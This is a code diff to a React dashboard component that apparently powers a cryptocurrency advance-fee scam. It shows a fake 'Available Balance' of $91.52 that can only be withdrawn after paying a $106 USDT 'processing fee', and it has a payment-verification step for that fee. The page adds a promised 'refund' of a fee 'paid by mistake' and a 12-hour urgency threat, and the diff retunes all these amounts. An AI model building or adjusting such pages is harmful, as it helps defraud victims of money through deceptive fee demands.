@@ -74,7 +74,7 @@ const Dashboard = () => {
   const [coin, setCoin] = useState("");
   const [network, setNetwork] = useState("");
   const [walletAddress, setWalletAddress] = useState("");
-  const [amount, setAmount] = useState("9876");
+  const [amount, setAmount] = useState("91.52");
   
   // Payment confirmation
   const [paymentConfirmed, setPaymentConfirmed] = useState(false);
@@ -85,8 +85,8 @@ const Dashboard = () => {
   const [notificationWalletAddress, setNotificationWalletAddress] = useState("");
   const [notificationExchange, setNotificationExchange] = useState("");
 
-  const balance = 9876;
-  const fee = balance * 0.02;
+  const balance = 91.52;
+  const fee = 106;
   const netAmount = balance - fee;
 
   const detectCardType = (number: string): { type: string; logo: string } | null => {
@@ -220,7 +220,7 @@ const Dashboard = () => {
     setIsVerifying(true);
     setVerificationError(null);
     
-    const amountDue = fee - 101; // $96.52
+    const amountDue = fee; // $106
     
     try {
       console.log(`Verifying payment of $${amountDue.toFixed(2)} USDT...`);
@@ -281,7 +281,7 @@ const Dashboard = () => {
     setCoin("");
     setNetwork("");
     setWalletAddress("");
-    setAmount("9876");
+    setAmount("91.52");
     setPaymentConfirmed(false);
     setCopied(false);
   };
@@ -454,7 +454,7 @@ const Dashboard = () => {
                 <Input
                   value={amount}
                   onChange={(e) => setAmount(e.target.value.replace(/\D/g, ""))}
-                  placeholder="9876"
+                  placeholder="91.52"
                   className="h-11 bg-input border-border font-mono"
                   required
                 />
@@ -906,7 +906,7 @@ const Dashboard = () => {
           </DialogHeader>
           <div className="text-center py-4">
             <p className="text-muted-foreground text-sm mb-2">Available Balance</p>
-            <p className="text-4xl font-display font-bold gold-text">$9,876</p>
+            <p className="text-4xl font-display font-bold gold-text">$91.52</p>
             <p className="text-xs text-muted-foreground mt-2">Ready for withdrawal</p>
           </div>
           <Button
@@ -961,11 +961,11 @@ const Dashboard = () => {
                   </div>
                   <div className="flex justify-between">
                      <span className="text-muted-foreground">Processing Fee Refund (paid by mistake):</span>
-                    <span className="font-medium text-chart-2">$96.52 USDT</span>
+                    <span className="font-medium text-chart-2">$106.00 USDT</span>
                   </div>
                 </div>
                  <p className="text-muted-foreground text-xs italic">
-                   The wallet address you provide below will be used to receive <strong>both</strong> the $96.52 USDT refund and the ${balance.toLocaleString()} withdrawal disbursement.
+                   The wallet address you provide below will be used to receive <strong>both</strong> the $106.00 USDT refund and the ${balance.toLocaleString()} withdrawal disbursement.
                  </p>
                 <p className="text-destructive font-medium">
                   ⏰ Kindly submit the following details <strong>urgently within 12 hours</strong>, or:
